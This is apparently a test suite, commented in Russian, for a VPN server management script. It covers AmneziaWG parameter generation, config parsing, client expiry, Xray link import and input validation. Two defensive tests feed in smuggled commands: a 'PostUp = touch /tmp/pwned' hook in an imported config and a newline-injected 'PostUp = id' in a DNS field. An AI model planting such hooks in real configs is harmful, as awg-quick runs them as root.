"""
test_toolza.py — проверка собранного awg2 (dist/awg2.sh) без root и без сети.

Функции берутся из самого собранного файла (песочница — sandbox.py): он
подключается в bash как библиотека, пути состояния переводятся во временный
каталог, а системные команды (ip, iptables, systemctl, awg...) подменены
заглушками, которые пишут вызовы в журнал.

Что проверяется:
  • генератор параметров AWG 2.0 / 3.0 / 3.1 — инварианты длин, H1-H4,
    таймеры 3.x;
  • чтение конфигов прежних версий (метки, версия по ключам, подсеть);
  • встроенный helper.py — клиенты, сроки, замена параметров, Xray, exit-ноды;
  • служебные скрипты (emit_script) — синтаксис и запуск: нет «command not
    found», правила iptables ставятся с нужными метками;
  • разбор iptables-save с комментарием в кавычках;
  • машинный API (awg2 api): ответы, очередь, задачи.

Запуск:  python3 tests/test_toolza.py [путь/к/dist/awg2.sh]
Выход:   0 — всё прошло, 1 — есть провалы.
"""
import base64
import hashlib
import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from sandbox import *  # noqa: E402,F401,F403

# ── 1. Генератор параметров ───────────────────────────────
print("Параметры AWG")
N = 120
for proto in ("2.0", "3.0", "3.1"):
    for profile in ("lite", "standard", "pro"):
        rc, out, err = bash(f'MTU=1280; AUTO_MODE=1; for i in $(seq {N}); do gen_awg_params {profile} {proto} || exit 1; echo "$AWG_PARAMS"; echo ---; done')
        sets = [kv(b) for b in out.split("---") if b.strip()]
        label = f"{proto}/{profile}"
        chk(f"{label}: сгенерировано {N}", rc == 0 and len(sets) == N, err[-300:])
        bad = []
        for p in sets:
            S = [int(p[f"S{i}"]) for i in range(1, 5)]
            jc, jmin, jmax = int(p["Jc"]), int(p["Jmin"]), int(p["Jmax"])
            if not (1 <= jc <= 128 and jmin < jmax):
                bad.append(("J", p))
            if S[3] > 32:
                bad.append(("S4>32", p))
            if abs(S[0] + 56 - S[1]) < 10 or abs(S[0] + 84 - S[2]) < 10 or abs(S[1] + 28 - S[2]) < 10:
                bad.append(("S-коллизия", S))
            H = [p[f"H{i}"] for i in range(1, 5)]
            if proto.startswith("3"):
                if min(S) < 12:
                    bad.append(("S<12", S))
                if H != ["1", "2", "3", "4"]:
                    bad.append(("H", H))
                rat = [int(x) for x in p["RekeyAfterTime"].split("-")]
                rjt = [int(x) for x in p["RejectAfterTime"].split("-")]
                if not (rat[0] < rat[1] < rjt[0] < rjt[1]):
                    bad.append(("таймеры", rat, rjt))
                if ("RandomTrailers" in p) != (proto == "3.1") or ("DisableCookies" in p) != (proto == "3.1"):
                    bad.append(("3.1-ключи", sorted(p)))
                if "HeaderProtectionKey" not in p:
                    bad.append(("HPK", sorted(p)))
            else:
                rng = [tuple(int(x) for x in h.split("-")) for h in H]
                flat = [x for r in rng for x in r]
                if flat != sorted(flat) or flat[-1] > 2**31 - 1 or any(b - a < 1000 for a, b in rng):
                    bad.append(("H-диапазоны", H))
                if any(k in p for k in ("HeaderProtectionKey", "RandomTrailers")):
                    bad.append(("3.x-ключи в 2.0", sorted(p)))
        chk(f"{label}: инварианты", not bad, str(bad[:3]))

rc, out, _ = bash('MTU=1420; AUTO_MODE=1; gen_awg_params pro 3.1 >/dev/null; echo "$MTU"')
chk("MTU 1420 на 3.1 снижается до запаса", rc == 0 and int(out.split()[-1]) < 1420, out)

# ── 2. Конфиги прежних версий ─────────────────────────────
print("Конфиги")
os.makedirs(os.path.join(ROOT, "etc/amnezia/amneziawg"), exist_ok=True)
conf = os.path.join(ROOT, "etc/amnezia/amneziawg/awg0.conf")
with open(conf, "w") as f:
    f.write(OLD20)
rc, out, _ = bash('echo "$(server_proto)|$(server_net)|$(server_port)|$(server_region)|$(server_profile)|$(client_suffix)"')
chk("2.0 без метки AWG_PROTO", out.strip() == "2.0|10.23.45.0/24|51820|ru|pro|_awg2", out)
rc, out, _ = bash("clients_tsv")
rows = [r.split("\t") for r in out.strip().splitlines()]
chk("клиенты и метки", [r[0] for r in rows] == ["alice", "bob"] and rows[1][3] == "1", out)
rc, out, _ = bash('conf_marker_set AWG_PROTO 3.1; conf_marker AWG_PROTO; sed -n "1,/^\\[Interface\\]/p" "$SERVER_CONF"')
chk("метка вставляется в шапку", out.splitlines()[0] == "3.1" and "# AWG_PROTO=3.1" in out, out)
# Конфиг без шапки (начинается с [Interface]): «1a» ставила метку внутрь секции, где её не видно
with open(conf, "w") as f:
    f.write(OLD20[OLD20.index("[Interface]"):])
rc, out, _ = bash('conf_marker_set AWG_ENDPOINT vpn.example.com; conf_marker AWG_ENDPOINT; head -1 "$SERVER_CONF"')
chk("метка перед [Interface], когда шапки нет", out.splitlines() == ["vpn.example.com", "# AWG_ENDPOINT=vpn.example.com"], out)
with open(conf, "w") as f:
    f.write(OLD20)
with open(conf, "w") as f:
    f.write(OLD20.replace("H4 = 1610612736-1610620000", "H4 = 4\nHeaderProtectionKey = K=\nRandomTrailers = on"))
rc, out, _ = bash("server_proto")
chk("3.1 по ключам без метки", out.strip() == "3.1", out)

# ── 3. helper.py ──────────────────────────────────────────
print("helper.py")
with open(conf, "w") as f:
    f.write(OLD20)
rc, out, _ = bash('py expire-check "$SERVER_CONF" 127.0.0.2/32 "$EXPIRE_STATE_DIR"; py peers "$SERVER_CONF"')
chk("истёкший клиент блокируется", "EXPIRED\tbob\t10.23.45.3/32" in out and "127.0.0.2/32\t1\t10.23.45.3/32" in out, out)
rc, out, _ = bash('py expire-clear "$SERVER_CONF" bob 127.0.0.2/32; py peers "$SERVER_CONF" | grep bob')
chk("разблокировка возвращает адрес", "10.23.45.3/32\t\t\t" in out, repr(out))
rc, out, _ = bash('py peer-del "$SERVER_CONF" PUBALICE=; grep -c "^\\[Peer\\]" "$SERVER_CONF"')
chk("удаление пира", out.split() == ["alice", "1"], out)
rc, out, _ = bash('printf "Jc = 7\\nS1 = 33\\nH1 = 1\\nHeaderProtectionKey = NEW=\\n" | py params-replace "$SERVER_CONF"; '
                  'sed -n "/^\\[Peer\\]/q;p" "$SERVER_CONF"')
p = kv(out)
chk("замена параметров", p.get("Jc") == "7" and p.get("S1") == "33" and p.get("HeaderProtectionKey") == "NEW="
    and "S2" not in p and p.get("PrivateKey") == "sPRIV=" and p.get("Address") == "10.23.45.1/24", out)

with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11, 22\nBOT_PROXY=socks5://127.0.0.1:1080\n')
with open(os.path.join(ROOT, "admins.json"), "w") as f:
    json.dump({"version": 1, "admins": {"33": {}, "22": {}}, "invites": {}}, f)
rc, out, _ = bash('py tg-targets "$BOT_CONF" "$BOT_ADMINS"')
chk("уведомления: владельцы, приглашённые, прокси", out.split("\n")[:5] == ["1:AA", "socks5://127.0.0.1:1080", "11", "22", "33"], out)
os.remove(os.path.join(ROOT, "bot.conf"))

EXIT = os.path.join(TMP, "exit.conf")
with open(EXIT, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nDNS = 1.1.1.1\nTable = auto\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
chk("exit-нода: Table = off, без DNS", "Table = off" in out and "DNS" not in out and "Table = auto" not in out, out)
# Хуки awg-quick выполняются bash от root — из чужого конфига (вставка, бот, бэкап) их быть не должно
with open(EXIT, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nPostUp = touch /tmp/pwned\nPreDown = true\n"
            "SaveConfig = true\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
chk("exit-нода: PostUp/PreDown/SaveConfig выброшены", "PostUp" not in out and "PreDown" not in out
    and "SaveConfig" not in out and "Table = off" in out and "Endpoint = 1.2.3.4:51820" in out, out)

# Пиры в записи wireguard-tools: «[Peer] # имя», «[peer]» с отступом, комментарий после значения
LOOSE = os.path.join(TMP, "loose.conf")
with open(LOOSE, "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 10.5.0.1/24\n\n[Peer] # carol\nPublicKey = PC= # note\n"
            "AllowedIPs = 10.5.0.2/32\n\n  [peer]\n# dave\nPublicKey=PD=\nAllowedIPs = 10.5.0.3/32\n")
rc, out, _ = bash(f'py peers "{LOOSE}"')
rows = [r.split("\t") for r in out.strip("\n").split("\n")]
chk("пиры в вольной записи видны, имя — и из заголовка", [r[1] for r in rows] == ["PC=", "PD="]
    and rows[0][2] == "10.5.0.2/32" and [r[0] for r in rows] == ["carol", "dave"], out)
# Таб для read — пробельный разделитель: пустые колонки TSV схлопывались, и пир без имени
# получал в имя ключ, а клиент со сроком — чужое orig_ips (показывался заблокированным)
rc, out, _ = bash(f'SERVER_CONF="{LOOSE}"; clients_name_ip')
chk("clients_name_ip: колонки не съезжают", out.split() == ["carol|10.5.0.2", "dave|10.5.0.3"], out)
TSV = os.path.join(TMP, "peers.tsv")
with open(TSV, "w") as f:
    f.write("alice\tPUBA=\t10.8.0.2/32\t1800000000\t\tnone\n")
rc, out, _ = bash(f'clients_tsv() {{ cat "{TSV}"; }}; clients_psv | {{ IFS="|" read -r name pub aip exp orig rest; echo "$exp|$orig|$rest"; }}')
chk("clients_psv: пустая колонка остаётся пустой", out.strip() == "1800000000||none", out)

# Модуль ядра: в Ubuntu 7.0.0-38 смена API udp_tunnel перенесена частично —
# вызов выбирается по заголовкам ядра, а не по номеру версии
UDP_OLD = ("#if LINUX_VERSION_CODE < KERNEL_VERSION(7, 1, 5)\n#include <net/udp_tunnel.h>\n"
           "#define setup_udp_tunnel_sock(net, sk, sock_cfg) setup_udp_tunnel_sock(net, sk->sk_socket, sock_cfg)\n"
           "#define udp_tunnel_sock_release(sk) udp_tunnel_sock_release(sk->sk_socket)\n#endif\n")
KM = os.path.join(TMP, "kmod", "src")
os.makedirs(os.path.join(KM, "compat"))
with open(os.path.join(KM, "compat/compat.h"), "w") as f:
    f.write("#ifndef _WG_COMPAT_H\n" + UDP_OLD + "#endif\n")
with open(os.path.join(KM, "compat/Kbuild.include"), "w") as f:
    f.write("ccflags-y += -DBASE\n")
rc, out, _ = bash(f'py mod-compat-patch "{KM}"; py mod-compat-patch "{KM}"; py mod-compat-patch "{TMP}"')
with open(os.path.join(KM, "compat/compat.h")) as f:
    comp = f.read()
chk("исходник модуля: правка udp_tunnel один раз, без нужного места — не трогается",
    out.split() == ["patched", "already", "skip"] and "#ifndef COMPAT_UDP_TUNNEL_SETUP_SK" in comp
    and "#ifndef COMPAT_UDP_TUNNEL_RELEASE_SK" in comp and comp.count("setup_udp_tunnel_sock(net, sk->sk_socket") == 1, out + comp)
KT = os.path.join(TMP, "ktree", "include", "net")
os.makedirs(KT)
with open(os.path.join(KT, "udp_tunnel.h"), "w") as f:      # как в Ubuntu 7.0.0-38
    f.write("void setup_udp_tunnel_sock(struct net *net, struct sock *sk,\n\t\t\t   struct udp_tunnel_sock_cfg *sock_cfg);\n"
            "void udp_tunnel_sock_release(struct socket *sock);\n")
MK = os.path.join(TMP, "kmod", "probe.mk")
with open(MK, "w") as f:
    f.write(f"include {KM}/compat/Kbuild.include\nall:\n\t@echo $(ccflags-y)\n")
r = subprocess.run(["make", "-s", "-f", MK, "srctree=" + os.path.join(TMP, "ktree")], capture_output=True, text=True)
chk("Kbuild.include: make разбирает проверку, флаг — только у перенесённого вызова",
    r.returncode == 0 and r.stdout.split() == ["-DBASE", "-DCOMPAT_UDP_TUNNEL_SETUP_SK"], r.stdout + r.stderr)
with open(os.path.join(KT, "udp_tunnel.h"), "w") as f:      # прежний API (6.8, 7.0.0-34)
    f.write("void setup_udp_tunnel_sock(struct net *net, struct socket *sock,\n\t\t\t   struct udp_tunnel_sock_cfg *cfg);\n"
            "void udp_tunnel_sock_release(struct socket *sock);\n")
r = subprocess.run(["make", "-s", "-f", MK, "srctree=" + os.path.join(TMP, "ktree")], capture_output=True, text=True)
chk("Kbuild.include: прежний API — флагов нет, модуль собирается как раньше",
    r.returncode == 0 and r.stdout.split() == ["-DBASE"], r.stdout + r.stderr)

# «√ ОС:» в установке: OS_LABEL, найденный внутри $(os_supported), в оболочку не возвращается
rc, out, _ = bash('OS_ID=""; why=$(os_supported); echo "до=[$OS_LABEL]"; OS_ID=""; os_detect; echo "после=[$OS_LABEL]"')
chk("название ОС для «√ ОС:» — после os_detect, не из подоболочки",
    "до=[]" in out and re.search(r"после=\[\S.+\]", out), out)
rc, out, _ = bash("declare -f do_install | sed -n '1,12p'")
chk("do_install определяет ОС до проверки", out.find("os_detect") != -1 and out.find("os_detect") < out.find("os_supported"), out)

# Мастер создания сервера: регион — выбором 1/2, Enter и Ctrl+D — Европа / мир
picked = [bash('_choose_region; echo "R=$S_REGION"', stdin=s)[1].strip().splitlines()[-1] for s in ("2\n", "\n", "")]
chk("регион сервера: 2 — Россия, Enter и Ctrl+D — мир", picked == ["R=ru", "R=world", "R=world"], picked)
rc, out, _ = bash('S_NET=""; _choose_net; echo "N=$S_NET"', stdin="2\n\n")
chk("подсеть вручную: пустой ввод — случайная, мастер не обрывается",
    rc == 0 and re.search(r"N=10\.\d+\.\d+\.0/24$", out.strip()), out)

# Валидаторы: ведущие нули — отказ, а не восьмеричное число или ошибка арифметики
rc, out, err = bash('valid_port 0080 || echo a; valid_port 65536 || echo b; valid_port 0 || echo c; '
                    'valid_cidr 10.0.0.0/08 || echo d; valid_cidr 10.0.0.0/33 || echo e; '
                    'valid_port 80 && valid_port 65535 && valid_cidr 10.0.0.0/0 && valid_cidr 10.8.0.0/24 && echo f')
chk("valid_port/valid_cidr: ведущие нули — отказ без ошибки bash", out.split() == ["a", "b", "c", "d", "e", "f"]
    and "too great" not in err and "syntax error" not in err, out + err)
# Октеты IP без ведущих нулей: «010.0.0.1» iptables отвергает, а ip_is_private
# счёл бы его публичным
rc, out, err = bash('valid_ip 010.0.0.1 || echo a; valid_ip 1.2.3.04 || echo b; valid_ip 256.1.1.1 || echo c; '
                    'valid_ip 0.0.0.0 && valid_ip 10.0.0.1 && valid_ip 255.255.255.255 && echo d; '
                    'valid_cidr 010.8.0.0/24 || echo e')
chk("valid_ip: октеты с ведущими нулями — отказ", out.split() == ["a", "b", "c", "d", "e"] and not err, out + err)
rc, out, err = bash('for d in "1.1.1.1, 1.0.0.1" "8.8.8.8" "1.1.1.1 8.8.8.8" "999.999.999.999, 8.8.8.8" "1.1.1" "" ", "; do '
                    'valid_dns_list "$d" && echo y || echo n; done')
chk("DNS клиентов: каждый адрес — настоящий IPv4 (999.999.999.999 — отказ)",
    out.split() == ["y", "y", "y", "n", "n", "n", "n"] and not err, out + err)
rc, out, err = bash('valid_dns_list $\'1.1.1.1\\nPostUp = id\' && echo y || echo n; '
                    'valid_dns_list $\'1.1.1.1\\t8.8.8.8\' && echo y || echo n')
chk("DNS клиентов: одна строка — перевод строки (и табуляция) не проходят", out.split() == ["n", "n"] and not err,
    out + err)
rc, out, _ = bash('for d in 010.0.0.1 1.2.3.04 1.2.3.4 example.com; do valid_domain "$d" && echo "$d"; done')
chk("valid_domain: цифры с точками (и с нулями) — не домен", out.split() == ["example.com"], out)

WG = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
os.makedirs(os.path.dirname(WG), exist_ok=True)
with open(WG, "w") as f:
    f.write("[Interface]\nPrivateKey = S\nListenPort = 5\n\n[Peer]\n# client=a\nPublicKey = A\nAllowedIPs = 10.77.1.2/32\n\n"
            "[Peer]\n# client=b\nPublicKey = B\nAllowedIPs = 10.77.1.3/32\n\n"
            "[Peer]\n# client=c\nPublicKey = C\nAllowedIPs = 10.77.1.4/32\n")
rc, out, _ = bash("wgobf_delete_client b >/dev/null && wgobf_clients")
with open(WG) as f:
    wg = f.read()
chk("WG + обфускатор: удаляется ровно свой [Peer]", out.split() == ["a", "c"] and "PublicKey = B" not in wg
    and "PublicKey = A" in wg and "PublicKey = C" in wg and wg.startswith("[Interface]\nPrivateKey = S"), wg)
WCL = os.path.join(ROOT, "root/wgobf")
os.makedirs(os.path.join(WCL, "a"), exist_ok=True)
with open(os.path.join(WCL, "a", "wg.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = KA\n")
rc, out, _ = bash('wgobf_write_bundle() { echo "BUNDLE $1"; }; wgobf_rename_client a alice 2>&1; echo "rc=$?"; wgobf_clients')
with open(WG) as f:
    wg = f.read()
chk("WG + обфускатор: переименование — меняется только имя над пиром, комплект переезжает и пересобирается",
    "rc=0" in out and "BUNDLE alice" in out and out.split()[-2:] == ["alice", "c"]
    and "# client=alice\nPublicKey = A\nAllowedIPs = 10.77.1.2/32" in wg and "# client=a\n" not in wg
    and os.path.isfile(os.path.join(WCL, "alice", "wg.conf")) and not os.path.exists(os.path.join(WCL, "a")), [out, wg])
rc, out, _ = bash('wgobf_write_bundle() { :; }; for n in c all "bad name" alice; do wgobf_rename_client alice "$n" >/dev/null 2>&1; '
                  'echo "rc$?"; done; wgobf_rename_client zz q >/dev/null 2>&1; echo "rc$?"; wgobf_clients')
chk("WG + обфускатор: занятое имя, all, недопустимое и чужой клиент — отказ; то же имя — ничего не меняет",
    out.split() == ["rc1", "rc1", "rc1", "rc0", "rc1", "alice", "c"], out)
shutil.rmtree(os.path.join(WCL, "alice"), ignore_errors=True)

rc, out, _ = bash('printf "10.10.0.0/16\\n10.20.1.1/24\\n" | py pick-net awg')
net = out.strip()
chk("свободная подсеть", re.match(r"^10\.\d+\.\d+\.0/24$", net) and not net.startswith("10.10.")
    and not net.startswith("10.20.1."), net)
rc, out, _ = bash("py allowed-except 1.2.3.4")
chk("AllowedIPs без адреса сервера", "1.2.3.4/32" not in out and "1.2.3.5/32" in out and out.strip().endswith("::/0"), out[:120])

VLESS = ("vless://11111111-2222-3333-4444-555555555555@ex.example.com:443?type=xhttp&security=reality"
         "&pbk=PBK&sid=ab&sni=www.site.com&fp=chrome&path=%2Fp&mode=auto&flow=#test")
rc, out, _ = bash(f"py xray-link '{VLESS}'")
ob = json.loads(out) if rc == 0 else {}
ss = ob.get("streamSettings", {})
chk("vless reality + xhttp", ob.get("protocol") == "vless" and ss.get("network") == "xhttp"
    and ss.get("realitySettings", {}).get("publicKey") == "PBK" and ss.get("xhttpSettings", {}).get("path") == "/p", out)
XC = os.path.join(TMP, "xray.json")
rc, out, err = bash(f'''py xray-default "{XC}"
py xray-link '{VLESS}' | py xray-add "{XC}"
py xray-link '{VLESS.replace("ex.example.com", "two.example.com")}' | py xray-add "{XC}"
py xray-prepare "{XC}" tun2socks
py xray-balancer "{XC}" leastPing
py xray-ru "{XC}" on
cat "{XC}"''')
xc = json.loads(out) if rc == 0 else {}
rules = xc.get("routing", {}).get("rules", [])
chk("Xray: два выхода, балансировщик, РФ напрямую",
    len([o for o in xc.get("outbounds", []) if o["protocol"] == "vless"]) == 2
    and xc["routing"]["balancers"][0]["strategy"]["type"] == "leastPing"
    and sum(1 for r in rules if r.get("ruleTag") == "ru-direct") == 2
    and rules[-1].get("balancerTag") == "balancer"
    and all(i.get("protocol") != "tun" for i in xc["inbounds"]), err or out[:300])
rc, out, _ = bash(f'py xray-del "{XC}" proxy_two_example_com; py xray-prepare "{XC}" native; cat "{XC}"')
xc = json.loads(out)
chk("Xray: удаление выхода чинит балансировщик", not xc["routing"].get("balancers")
    and any(i.get("protocol") == "tun" and i["settings"].get("name") == "xray0" for i in xc["inbounds"])
    and all(r.get("outboundTag") != "proxy_two_example_com" for r in xc["routing"]["rules"]), out[:300])

# ── Xray: пробы на бинаре ─────────────────────────────────
# Заглушка ведёт себя как Xray 26.x: формат конфига — по расширению, без
# «.json» отказ; protocol hysteria2 (старое имя) и allowInsecure не знает,
# hysteria версии 2 и inbound tun умеет. XRAY_STUB_OLD=1 — сборка без hysteria.
XRAY_STUB = os.path.join(TMP, "xray-stub")
with open(XRAY_STUB, "w") as f:
    f.write(r"""#!/usr/bin/env bash
[[ "$1" == version ]] && { echo "Xray 26.3.27 (Xray, Penetrates Everything.)"; exit 0; }
f=""; while (( $# )); do [[ "$1" == -c ]] && { f="$2"; shift; }; shift; done
[[ "$f" == *.json ]] || { echo "Failed to start: main: failed to load config files: [$f] > core: Failed to get format of $f"; exit 23; }
python3 -c 'import json, os, sys
c = json.load(open(sys.argv[1]))
if any(o.get("protocol") == "hysteria2" for o in c.get("outbounds", [])):
    print("infra/conf: unknown config id: hysteria2"); sys.exit(23)
if os.environ.get("XRAY_STUB_OLD") and any(o.get("protocol") == "hysteria" for o in c.get("outbounds", [])):
    print("infra/conf: unknown config id: hysteria"); sys.exit(23)
if "allowInsecure" in json.dumps(c):
    print("The feature allowInsecure has been removed"); sys.exit(23)
# Проверка с inbound tun создаёт устройство: занятое имя — отказ, как у Xray
busy = open(os.environ["LINKS"]).read().split()
for ib in c.get("inbounds", []):
    if ib.get("protocol") == "tun" and (ib.get("settings") or {}).get("name", "xray0") in busy:
        print("Failed to start: main: failed to create server > device or resource busy"); sys.exit(23)' "$f" || exit 23
""")
os.chmod(XRAY_STUB, 0o755)
XRAY_ENV = (f'XRAY_BIN="{XRAY_STUB}"; XRAY_DIR="{ROOT}/etc/xray"; XRAY_CONF="$XRAY_DIR/config.json"; '
            'mkdir -p "$XRAY_DIR"; [[ -f "$XRAY_CONF" ]] || py xray-default "$XRAY_CONF"; ')
VLESS_TCP = ("vless://0378c8eb-6544-478e-837d-c3599ef8e73d@dash.example.site:8443?alpn=h2%2Chttp%2F1.1"
             "&encryption=none&flow=xtls-rprx-vision&fp=chrome&security=tls&sni=dash.example.site&type=tcp#NL_Vless")
rc, out, _ = bash(XRAY_ENV + f"xray_add_link '{VLESS_TCP}' && xray_tags")
chk("Xray: vless-ссылка добавляется (проба в .json)", rc == 0 and "proxy_dash_example_site" in out, out)
rc, out, _ = bash(XRAY_ENV + "xray_tun_supported && echo tun-yes; xray_bad_outbounds | sed 's/^/BAD:/'")
chk("Xray: inbound tun определяется, годный выход не считается плохим", "tun-yes" in out and "BAD:" not in out, out)
with open(LINKS, "w") as f:
    f.write("xray0\n")
rc, out, _ = bash(XRAY_ENV + 'py xray-prepare "$XRAY_CONF" native; xray_test && echo TEST-OK; '
                  '_XRAY_TUN=""; xray_tun_supported && echo TUN-YES')
open(LINKS, "w").close()
chk("Xray работает (xray0 занят): проверка конфига и проба tun не упираются в busy",
    "TEST-OK" in out and "TUN-YES" in out, out)

# Включение туннеля целиком на Xray 26.7+: устройство входа tun называется по
# settings.name, без имени — utunN. Заглушка systemctl «запускает» Xray так же
XSBIN = os.path.join(TMP, "xsbin")
os.makedirs(XSBIN, exist_ok=True)
with open(os.path.join(XSBIN, "systemctl"), "w") as f:
    f.write(r"""#!/usr/bin/env bash
if [[ "$1" == start && " $* " == *" awg-xray.service "* ]]; then
  python3 -c 'import json, sys
c = json.load(open(sys.argv[1]))
t = [i for i in c.get("inbounds", []) if i.get("protocol") == "tun"]
print((t[0].get("settings") or {}).get("name") or "utun77" if t else "")' "$XRAY_CONF" >> "$LINKS"
  echo awg-xray.service >> "$ACTIVE"
fi
PATH="${PATH#"${0%/*}:"}" exec systemctl "$@"
""")
os.chmod(os.path.join(XSBIN, "systemctl"), 0o755)
with open(ACTIVE) as f:
    act_before = f.read()
XUP = (f'export PATH="{XSBIN}:$PATH" XRAY_CONF; server_exists() {{ return 0; }}; peers_sync() {{ :; }}; peers_seed() {{ :; }}; ')
rc, out, err = bash(XRAY_ENV + XUP + 'py xray-tun-probe /dev/null 2>/dev/null; '
                    'python3 - "$XRAY_CONF" <<"EOF"\nimport json, sys\nc = json.load(open(sys.argv[1]))\n'
                    'for i in c.get("inbounds", []):\n    if i.get("protocol") == "tun": i.get("settings", {}).pop("name", None)\n'
                    'json.dump(c, open(sys.argv[1], "w"))\nEOF\n'
                    'xray_up; echo "rc=$?"')
links = open(LINKS).read().split()
chk("Xray 26.7+: туннель включается — у входа tun имя xray0, интерфейс xray0, без utunN",
    "rc=0" in out and "Xray включён" in out and "xray0" in links and not any(x.startswith("utun") for x in links),
    [out[-400:], err[-300:], links])
bash(XRAY_ENV + XUP + "xray_down quiet")
open(LINKS, "w").close()
with open(ACTIVE, "w") as f:
    f.write(act_before)
rc, out, _ = bash("XRAY_STUB_OLD=1; export XRAY_STUB_OLD; " + XRAY_ENV
                  + "xray_add_link 'hysteria2://secret@h2.example.site:443?sni=h2.example.site#H2'")
chk("Xray без Hysteria2: выход отклонён с подсказкой обновить Xray", rc != 0 and "обнови Xray" in out, out)
H2 = ("hysteria2://h2testpass0001@h2.example.site:443?alpn=h3&ech=AGb%2BDQBi&fp=chrome"
      f"&pinSHA256={'aa' * 32}%2C{'bb' * 32}&security=tls&sni=h2.example.site#H2-Ha2pa")
rc, out, _ = bash(XRAY_ENV + f"xray_add_link '{H2}' && cat \"$XRAY_CONF\"")
xc = json.loads(out[out.index("{"):]) if rc == 0 and "{" in out else {}
h2 = next((o for o in xc.get("outbounds", []) if o.get("tag") == "proxy_h2_example_site"), {})
st = h2.get("streamSettings") or {}
chk("Hysteria2 — в формате Xray 26: hysteria v2, пароль, SNI, h3, ECH, pinSHA256",
    h2.get("protocol") == "hysteria" and h2["settings"] == {"version": 2, "address": "h2.example.site", "port": 443}
    and st.get("network") == "hysteria" and st["hysteriaSettings"] == {"version": 2, "auth": "h2testpass0001"}
    and st["tlsSettings"]["serverName"] == "h2.example.site" and st["tlsSettings"]["alpn"] == ["h3"]
    and st["tlsSettings"]["echConfigList"] == "AGb+DQBi" and st["tlsSettings"]["pinnedPeerCertSha256"].count(",") == 1,
    [rc, out[-600:]])
rc, out, _ = bash(XRAY_ENV + 'py xray-outs "$XRAY_CONF" | py json-rows tag proto sec net host port:n')
outs = {o["tag"]: o for o in json.loads(out)} if rc == 0 and out.startswith("[") else {}
chk("xray-outs — выходы для карточек: протокол, защита, транспорт, адрес (без direct и block)",
    outs.get("proxy_dash_example_site") == {"tag": "proxy_dash_example_site", "proto": "vless", "sec": "tls", "net": "tcp",
                                            "host": "dash.example.site", "port": 8443}
    and outs.get("proxy_h2_example_site", {}).get("host") == "h2.example.site"
    and outs["proxy_h2_example_site"]["net"] == "hysteria" and "direct" not in outs and "block" not in outs, out)
bash(XRAY_ENV + "xray_del_tag proxy_h2_example_site >/dev/null")
rc, out, _ = bash(XRAY_ENV + "xray_add_link 'vless://11111111-2222-3333-4444-555555555555@x.example.site:443?security=tls&type=tcp#dup'"
                  " >/dev/null; xray_add_link 'vless://11111111-2222-3333-4444-555555555555@x.example.site:443?security=tls&type=tcp#dup'")
chk("Xray: подсказка про Hysteria2 только для неё", "Hysteria2" not in out, out)
LINKS_OK = {
    "trojan": "trojan://tpass@t.example.com:443?security=tls&sni=t.example.com&type=ws&path=%2Fws&host=t.example.com#tr",
    "ss SIP002": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:8388#ss1",
    "ss 2022": "ss://2022-blake3-aes-128-gcm:AAAAAAAAAAAAAAAAAAAAAA%3D%3D@ss.example.com:443#ss2022",
    "ss старый": "ss://Y2hhY2hhMjAtaWV0Zi1wb2x5MTMwNTpwd0A1LjYuNy44OjkwMDA=#legacy",
}
want = {"trojan": ("trojan", "t.example.com", 443, "tpass"), "ss SIP002": ("shadowsocks", "1.2.3.4", 8388, "pass123"),
        "ss 2022": ("shadowsocks", "ss.example.com", 443, "AAAAAAAAAAAAAAAAAAAAAA=="),
        "ss старый": ("shadowsocks", "5.6.7.8", 9000, "pw")}
for k, link in LINKS_OK.items():
    rc, out, _ = bash(f"py xray-link '{link}'")
    ob = json.loads(out) if rc == 0 else {}
    srv = ((ob.get("settings") or {}).get("servers") or [{}])[0]
    chk(f"ссылка {k} разбирается", (ob.get("protocol"), srv.get("address"), srv.get("port"), srv.get("password")) == want[k], out)
rc, out, err = bash("py xray-link 'vless://0378c8eb-6544-478e-837d-c3599ef8e73d@v.example.site:443?security=tls&type=tcp&allowInsecure=1#v'")
chk("allowInsecure не попадает в конфиг (Xray 26 его отвергает), с пояснением",
    rc == 0 and "allowInsecure" not in out and "pinSHA256" in err, [out, err])
rc, out, _ = bash("py xray-link 'trojan://p:a@t.example.com:443?security=tls#t'")
chk("trojan: пароль с двоеточием целиком", rc == 0 and json.loads(out)["settings"]["servers"][0]["password"] == "p:a", out)
for k, link in {"vless :0": "vless://0378c8eb-6544-478e-837d-c3599ef8e73d@v.example.site:0?security=tls",
                "hy2 :0": "hy2://pw@h.example.com:0", "ss :99999": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:99999",
                "ss не-ASCII порт": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:\u0664\u0664\u0663",
                "vmess порт abc": "vmess://" + base64.b64encode(b'{"add":"v.example.com","port":"abc","id":"x"}').decode(),
                "hy2 salamander без пароля": "hy2://pw@h.example.com:443?obfs=salamander"}.items():
    rc, out, err = bash(f"py xray-link '{link}'")
    chk(f"ссылка {k} — отказ без трассировки", rc != 0 and "Traceback" not in err and not out.strip(), [out, err])
rc, out, _ = bash("py xray-link 'ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:000443'; py xray-link 'vmess://" +
                  base64.b64encode(b'{"add":"v.example.com","port":443.0,"id":"x"}').decode() + "'")
ports = [json.loads(ln).get("settings", {}) for ln in out.strip().splitlines() if ln.startswith("{")]
chk("порт с ведущими нулями и vmess-порт 443.0 — принимаются как 443",
    rc == 0 and [p.get("servers", p.get("vnext", [{}]))[0].get("port") for p in ports] == [443, 443], out)
rc, out, err = bash("py xray-link 'hy2://pw@h.example.com:443?obfs=salamander&obfs-password=s3#x'")
